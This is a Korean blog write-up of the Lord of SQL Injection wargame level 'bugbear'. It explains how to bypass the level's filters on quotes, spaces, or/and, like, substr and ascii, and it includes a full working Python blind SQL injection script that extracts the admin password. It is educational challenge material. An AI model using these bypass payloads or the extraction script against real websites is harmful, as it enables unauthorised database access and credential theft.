---
title: LOS - 13번 bugbear
category: Lord of SQL Injection
---

# [13] bugbear

## 문제

<img  src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbLtSV8%2Fbtrnpm1hg3C%2F5J4zNxs1CJ1BkZonWk6lS1%2Fimg.png">

## 풀이

preg_match에 뭐가 좀 많다.

하나하나 살펴본다.

<br>

필터링 사항이다.

① 싱글쿼터

② substr

③ ascii

④ =

⑤ or/and

⑥ 공백

⑦ like

⑧ 0x

<br> 

지금까지의 필터링 사항을 몽땅 다 집어넣었다.

<br>

추가로 like에 대한 필터링까지 적용되었는데, 이에 대한 우회 방법은 다음과 같다.

① like ⇒ in

- ex. id like "admin" ⇒ id in ("admin")

<br> 

그리고 또 한가지 특이사항이 있다.

저번 문제에서는 ascii를 ord로 우회했었다.

그러나 이번 문제에서는 or을 필터링하고 있기 때문에 ord도 해당 필터에 걸려버린다.

(이 부분을 간과해서 시간을 잡아먹었다...)

<br> 

따라서 이번 문제에서는 ascii를 **hex**로 우회해준다.

hex 함수는 이름 그대로, 문자를 ascii가 아닌 hex로 나타내주는 함수이다.

hex의 반환 타입은 string이기에 단순 숫자로 취급하여 대소 비교를 해줄 수는 없다.

때문에 in을 사용하여 문자열 일치 확인을 해줄 것이다.

이 때, 비교 대상으로 사용할 ascii값도 hex로 변환하여 비교해준다.

- ex. hex(mid(...)) in (hex(1))

<br>

한편, 준비된 쿼리문은 12번 문제와 동일하기 때문에,

쿼리문 변조 방향에 대한 상세한 설명은 이전 포스팅으로 대체한다.

 
<br>
 

이상의 내용을 반영하여 자동화 코드의 **check_length()** 를 다음과 같이 수정해준다.

```python
def check_length(url, cookie):
    head = {"PHPSESSID":f"{cookie}"}
    print("대상 문자열의 길이를 확인중입니다..")
    for num in range(0,30):
        param=f"?no=0||id%09in%09(\"admin\")%26%26length(pw)>{num}%09%23"
        my_url=url+param
        res=requests.get(my_url, cookies=head)
        if("Hello admin" not in res.text):
            return num
```
① or/and ⇒ \|\|, %26%26

② 공백 ⇒ %09

③ like ⇒ in

 
<br>
 

다음으로는 **blind_sqli()** 를 다음과 같이 수정해준다.

```python
def blind_sqli(url, cookie, length):
    head = {"PHPSESSID":f"{cookie}"}
    ans=""
    for len in range(1, length+1):
        print(f"{len}번째 문자에 대해 검색중입니다..")
        for ran in range(32,127):
            param=f"?no=0||id%09in%09(\"admin\")%26%26hex(mid(pw,{len},1))%09in%09(hex({ran}))%09%23"
            my_url=url+param
            res=requests.get(my_url, cookies=head)
            if("Hello admin" in res.text):
                print(f"{len}번째 문자 → {chr(ran)}")
                ans+=chr(ran)
                break
    return ans
```

① or/and ⇒ \|\|, %26%26

② 공백 ⇒ %09

③ like ⇒ in

④ substr ⇒ mid

⑤ ascii ⇒ hex

 
<br>
 

**수정된 Python 자동화 코드의 전문**이다.

```python
import requests

def check_length(url, cookie):
    head = {"PHPSESSID":f"{cookie}"}
    print("대상 문자열의 길이를 확인중입니다..")
    for num in range(0,30):
        param=f"?no=0||id%09in%09(\"admin\")%26%26length(pw)>{num}%09%23"
        my_url=url+param
        res=requests.get(my_url, cookies=head)
        if("Hello admin" not in res.text):
            return num

def blind_sqli(url, cookie, length):
    head = {"PHPSESSID":f"{cookie}"}
    ans=""
    for len in range(1, length+1):
        print(f"{len}번째 문자에 대해 검색중입니다..")
        for ran in range(32,127):
            param=f"?no=0||id%09in%09(\"admin\")%26%26hex(mid(pw,{len},1))%09in%09(hex({ran}))%09%23"
            my_url=url+param
            res=requests.get(my_url, cookies=head)
            if("Hello admin" in res.text):
                print(f"{len}번째 문자 → {chr(ran)}")
                ans+=chr(ran)
                break
    return ans

if __name__ == "__main__":
    print("💘 Blind 공격을 시작합니다")
    
    url=input("URL을 입력하세요:")
    cookie=input("cookie를 알려주세요:")
    
    length=check_length(url, cookie)
    print(f"👏 pw의 길이는 {length}입니다.")
    
    ans=blind_sqli(url, cookie, length)
    print(f"👏 pw의 정체는 {ans}입니다!")
    
    exit
```

<img width src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbnT6Iq%2FbtrnrkVXp3E%2FB0kaNZJZYO5fBkBBsnzkh0%2Fimg.png">

Blind 공격 결과, admin의 pw는 `52dc3991` 이다.

## 결과

<img  src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FdC3vzR%2FbtrnktUFiVR%2FEKEDpBeOAVsMfdTukaBKY0%2Fimg.png">